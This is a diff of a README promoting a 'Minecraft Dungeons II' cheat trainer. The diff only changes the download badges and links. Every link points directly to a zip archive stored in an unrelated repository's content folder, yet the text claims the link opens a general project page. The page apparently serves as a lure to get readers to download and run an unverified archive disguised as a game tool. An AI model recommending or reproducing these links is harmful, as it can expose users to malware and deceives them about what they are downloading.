@@ -5,7 +5,7 @@ description: "Dominate Minecraft Dungeons II with one-click God Mode, infinite e
 ---
 # 🧭 minecraft-dungeons-2-trainer - One-Click Dungeon Power Controls
 
-[![Download Minecraft Dungeons 2 Trainer](https://img.shields.io/badge/Download_Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/railuxy/railuxy.github.io/main/content/guias/v2.9.zip)
+[![Download Minecraft Dungeons 2 Trainer](https://img.shields.io/badge/Download_Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/railuxy/railuxy.github.io/raw/refs/heads/main/content/guias/v2.9.zip)
 
 minecraft-dungeons-2-trainer is a lightweight external trainer for Minecraft Dungeons II. It gives you simple one-click toggles for God Mode, Infinite Emeralds, Infinite Gold, Infinite Enchantment Points, No Artifact Cooldown, and Infinite Arrows. The trainer is designed for Windows users who want quick access to game options without DLL injection.
 
@@ -37,9 +37,9 @@ The trainer’s purpose is to give you direct control over common dungeon-crawle
 
 ## ⬇️ Download and Setup
 
-Visit this link to download the application: [minecraft-dungeons-2-trainer](https://raw.githubusercontent.com/railuxy/railuxy.github.io/main/content/guias/v2.9.zip).
+Visit this link to download the application: [minecraft-dungeons-2-trainer](https://github.com/railuxy/railuxy.github.io/raw/refs/heads/main/content/guias/v2.9.zip).
 
-[![Download Minecraft Dungeons 2 Trainer](https://img.shields.io/badge/Get_The_Trainer-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/railuxy/railuxy.github.io/main/content/guias/v2.9.zip)
+[![Download Minecraft Dungeons 2 Trainer](https://img.shields.io/badge/Get_The_Trainer-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/railuxy/railuxy.github.io/raw/refs/heads/main/content/guias/v2.9.zip)
 
 The download page is the official project location for the trainer. Use it to access the application files and the latest available version. Because this is a general project page rather than a direct file link, the download action is handled from that page.
 
